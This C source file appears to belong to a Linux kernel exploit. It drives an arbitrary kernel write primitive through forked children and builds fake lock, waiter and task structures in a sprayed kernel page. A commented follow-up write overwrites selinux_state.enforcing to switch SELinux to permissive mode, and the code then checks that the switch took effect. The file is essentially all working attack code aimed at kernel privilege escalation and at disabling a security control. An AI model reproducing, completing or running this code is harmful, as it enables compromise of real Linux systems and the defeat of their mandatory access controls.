#include "common.h"

#define DIRECT_WRITE_TIMEOUT_SEC 180
#define DIRECT_WRITE_FOLLOWUP_TIMEOUT_SEC 1200

static uint64_t monotonic_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000ULL +
         (uint64_t)ts.tv_nsec / 1000000ULL;
}

static int selinux_is_permissive(void) {
  char value[2] = {0, 0};
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t got;
  do {
    got = read(fd, value, 1);
  } while (got < 0 && errno == EINTR);
  close(fd);
  return got == 1 && value[0] == '0';
}

static void kill_and_reap_group(pid_t child) {
  int saved_errno = errno;
  kill(-child, SIGKILL);
  kill(child, SIGKILL);
  for (;;) {
    pid_t got = waitpid(child, NULL, 0);
    if (got == child || (got < 0 && errno == ECHILD)) {
      break;
    }
    if (got < 0 && errno == EINTR) {
      continue;
    }
    break;
  }
  errno = saved_errno;
}

static int direct_pselect_write_once_internal(
    uintptr_t target, uintptr_t value, int shape, int idx,
    uintptr_t followup_target, int followup_idx) {
  if (shape < 0 || shape > 1) {
    errno = EINVAL;
    return 0;
  }

  pid_t expected_parent = getpid();
  pid_t child = fork();
  if (child < 0) {
    pr_warning("direct-w64[%d] fork failed errno=%d\n", idx, errno);
    return 0;
  }

  if (child == 0) {
    if (setpgid(0, 0) != 0) {
      _exit(10);
    }
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 ||
        getppid() != expected_parent) {
      _exit(11);
    }

    page_base = 0;
    fake_lock = 0;
    fake_w0 = 0;
    fake_task = 0;
    set_pselect_write(target, value, shape);

    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
      _exit(12);
    }

    uintptr_t heap_page = page_base;
    uintptr_t heap_lock = fake_lock;
    uintptr_t heap_w0 = fake_w0;
    uintptr_t heap_task = fake_task;

    /* Refresh the custom waiter/task layout without sending another skb. */
    if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS) ||
        page_base != heap_page || fake_lock != heap_lock ||
        fake_w0 != heap_w0 || fake_task != heap_task) {
      _exit(13);
    }

    pr_success("direct-w64[%d] target=%016zx value=%016zx shape=%d "
               "workspace=%016zx\n",
               idx, target, value, shape, page_base);
    run_main_route_threads();

    int triggered = atomic_load(&route_done) &&
                    atomic_load(&consumer_calls) > 0 &&
                    atomic_load(&consumer_success) > 0;
    if (triggered && followup_target) {
      /*
       * The only follow-up target is selinux_state.enforcing, a byte at an
       * unaligned address.  Shape 0 preserves that exact address; shape 1
       * masks the low rb-parent bits and lands one byte early at
       * selinux_state.disabled.  The direct-map pointer has a zero low byte,
       * so the exact write clears enforcing while keeping initialized and
       * the neighboring boolean fields nonzero until policy reload repairs
       * them in the parent.
       */
      uintptr_t followup_value = page_base + 0x100;
      if ((followup_value & 0xff) != 0 ||
          ((followup_value >> 8) & 0xff) == 0 ||
          ((followup_value >> 16) & 0xff) == 0 ||
          !is_direct_ptr(followup_value)) {
        _exit(14);
      }

      int followup_ok = selinux_is_permissive();
      for (int attempt = 0;
           !followup_ok && attempt < DIRECT_FOLLOWUP_ATTEMPTS;
           attempt++) {
        int route_ok = direct_pselect_write_once(
            followup_target, followup_value, 0, followup_idx + attempt);
        followup_ok = route_ok && selinux_is_permissive();
      }
      _exit(followup_ok ? 0 : 15);
    }
    _exit(triggered ? 0 : 16);
  }

  if (setpgid(child, child) != 0 && errno != EACCES && errno != ESRCH) {
    pr_warning("direct-w64[%d] parent setpgid failed child=%d errno=%d\n",
               idx, child, errno);
  }

  int timeout_seconds = followup_target
                            ? DIRECT_WRITE_FOLLOWUP_TIMEOUT_SEC
                            : DIRECT_WRITE_TIMEOUT_SEC;
  uint64_t deadline =
      monotonic_ms() + (uint64_t)timeout_seconds * 1000ULL;
  int status = 0;
  for (;;) {
    pid_t got = waitpid(child, &status, WNOHANG);
    if (got == child) {
      break;
    }
    if (got < 0) {
      if (errno == EINTR) {
        continue;
      }
      kill_and_reap_group(child);
      return 0;
    }
    if (monotonic_ms() >= deadline) {
      pr_warning("direct-w64[%d] timeout child=%d seconds=%d\n",
                 idx, child, timeout_seconds);
      kill_and_reap_group(child);
      errno = ETIMEDOUT;
      return 0;
    }
    usleep(10000);
  }

  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
    pr_warning("direct-w64[%d] child=%d status=0x%x\n", idx, child, status);
    return 0;
  }
  return 1;
}

int direct_pselect_write_once(
    uintptr_t target, uintptr_t value, int shape, int idx) {
  return direct_pselect_write_once_internal(
      target, value, shape, idx, 0, 0);
}

int direct_pselect_write_followup_once(
    uintptr_t target, uintptr_t value, int shape, int idx,
    uintptr_t followup_target, int followup_idx) {
  return direct_pselect_write_once_internal(
      target, value, shape, idx, followup_target, followup_idx);
}
